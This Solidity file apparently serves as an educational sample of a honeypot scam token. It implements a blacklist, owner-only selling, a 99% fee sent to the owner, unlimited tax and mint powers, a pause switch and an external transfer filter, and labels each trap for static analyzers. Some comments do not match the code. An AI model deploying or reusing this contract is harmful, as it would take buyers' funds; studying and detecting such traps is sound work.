// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Educational Honeypot Token (Classic Malicious Honeypot Archetype)
 * @author CSDF Educational Security Research Team
 * @dev This smart contract is an educational model of a classic EVM honeypot scam token.
 * 
 * =========================================================================
 * SECURITY VULNERABILITY & HONEYPOT TAXONOMY:
 * =========================================================================
 * 1. Arbitrary Address Blacklist (HONEYPOT_BLACKLIST):
 *    - An administrative mapping `isBlacklisted` allows the deployer to selectively block
 *      unsuspecting buyers from ever liquidating or transferring their tokens.
 * 
 * 2. Asymmetric Sell / DEX Transfer Restriction (HONEYPOT_SELL_RESTRICTION):
 *    - Buys from the Uniswap pair succeed seamlessly. However, sells back to `uniswapV2Pair`
 *      are guarded by `require(canSell[from])`, which is only granted to the contract owner.
 * 
 * 3. Unbounded Owner Fee Setter (HONEYPOT_UNLIMITED_OWNER_TAX):
 *    - The `setSellTax` function has no hardcoded ceiling (require(fee <= MAX)). The owner
 *      can silently hike transfer/sell fees to 99% or 100% after liquidity is deployed.
 * 
 * 4. Excessive / Confiscatory Sell Tax (HONEYPOT_EXCESSIVE_SELL_TAX):
 *    - Initialized with an exorbitant `sellTax = 99;` (99% fee), confiscating virtually
 *      all transferred value and diverting it directly into the deployer's wallet.
 * 
 * 5. Hidden Mint Backdoor (HONEYPOT_HIDDEN_MINT):
 *    - A privileged `mint()` function outside the constructor lets the owner inflate the
 *      total supply arbitrarily and dump freshly minted tokens into the liquidity pool.
 * 
 * 6. External Oracle / Permission Trap (HONEYPOT_EXTERNAL_RESTRICTION_CALL):
 *    - The transfer path invokes an unverified external interface `ITokenFilter` which can
 *      be programmed to return `false` on sell attempts.
 * 
 * 7. Obfuscated Inline Assembly (HONEYPOT_SUSPICIOUS_ASSEMBLY):
 *    - Low-level EVM assembly block used to manipulate caller context or evade simple AST detectors.
 */

interface ITokenFilter {
    function canTransfer(address sender, address recipient) external view returns (bool);
}

contract HoneypotToken {
    string public name = "Educational Honeypot Token";
    string public symbol = "HONEY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000 * 10**18;

    address public owner;
    address public uniswapV2Pair;
    address public securityOracle;

    // Balances and allowances
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // HONEYPOT TRAP 1: Blacklist mapping
    mapping(address => bool) public isBlacklisted;

    // HONEYPOT TRAP 2: Asymmetric sell permission mapping
    mapping(address => bool) public canSell;

    // HONEYPOT TRAP 3: Cooldown timestamp tracking
    mapping(address => uint256) public _holderLastTransferTimestamp;

    // HONEYPOT TRAP 4: Confiscatory sell fee initialized to 99%
    uint256 public sellTax = 99;

    // HONEYPOT TRAP 5: Microscopic max transaction limit
    uint256 public maxTxAmount = 1000 * 10**18;

    // HONEYPOT TRAP 6: Owner-controlled pause switch
    bool public paused = false;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event BlacklistUpdated(address indexed account, bool status);
    event TaxUpdated(uint256 newTax);

    modifier onlyOwner() {
        require(msg.sender == owner, "Honeypot: Caller is not the owner");
        _;
    }

    modifier notBlacklisted(address account) {
        require(!isBlacklisted[account], "Honeypot: Address is blacklisted");
        _;
    }

    constructor(address _pair, address _oracle) {
        owner = msg.sender;
        uniswapV2Pair = _pair;
        securityOracle = _oracle;
        balanceOf[msg.sender] = totalSupply;
        canSell[msg.sender] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    /**
     * @notice Allows the contract deployer to blacklist any wallet arbitrarily.
     */
    function setBlacklist(address account, bool state) external onlyOwner {
        isBlacklisted[account] = state;
        emit BlacklistUpdated(account, state);
    }

    /**
     * @notice Sets sell permissions (enabling asymmetric sell restrictions).
     */
    function setCanSell(address account, bool state) external onlyOwner {
        canSell[account] = state;
    }

    /**
     * @notice Unbounded fee setter: no ceiling check!
     * @dev Static analyzers detect this as HONEYPOT_UNLIMITED_OWNER_TAX.
     */
    function setSellTax(uint256 newTax) external onlyOwner {
        // VULNERABILITY: No `require(newTax <= 25)` sanity limit check!
        sellTax = newTax;
        emit TaxUpdated(newTax);
    }

    /**
     * @notice Permanent pause toggle freezing token transfers.
     */
    function pause() external onlyOwner {
        paused = true;
    }

    function unpause() external onlyOwner {
        paused = false;
    }

    /**
     * @notice Hidden unconstrained mint backdoor.
     * @dev Owner can arbitrarily dilute token circulating supply.
     */
    function mint(address account, uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @notice Standard ERC-20 transfer gated by blacklist modifier trap.
     */
    function transfer(address recipient, uint256 amount) external notBlacklisted(msg.sender) returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @notice Standard ERC-20 transferFrom gated by blacklist modifier trap.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external notBlacklisted(sender) returns (bool) {
        require(allowance[sender][msg.sender] >= amount, "ERC20: allowance exceeded");
        allowance[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    /**
     * @notice Internal transfer implementing composite honeypot logic.
     */
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from zero");
        require(to != address(0), "ERC20: transfer to zero");
        require(!paused, "Honeypot: Transfers are currently paused");
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        require(amount <= maxTxAmount, "Honeypot: Exceeds max transaction limit");

        // External permission restriction hook
        if (securityOracle != address(0)) {
            require(ITokenFilter(securityOracle).canTransfer(from, to), "External filter denied transfer");
        }

        // Asymmetric sell restriction: Ordinary holders cannot sell to liquidity pair
        if (to == uniswapV2Pair) {
            require(canSell[from], "Sells are not permitted for this wallet");
        }

        // Confiscatory 99% fee siphoned directly to deployer wallet
        uint256 fee = (amount * sellTax) / 100;
        uint256 transferAmount = amount - fee;

        // Suspicious inline assembly manipulating memory/state
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
        }

        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += fee;

        emit Transfer(from, to, transferAmount);
        if (fee > 0) {
            emit Transfer(from, owner, fee);
        }
    }
}
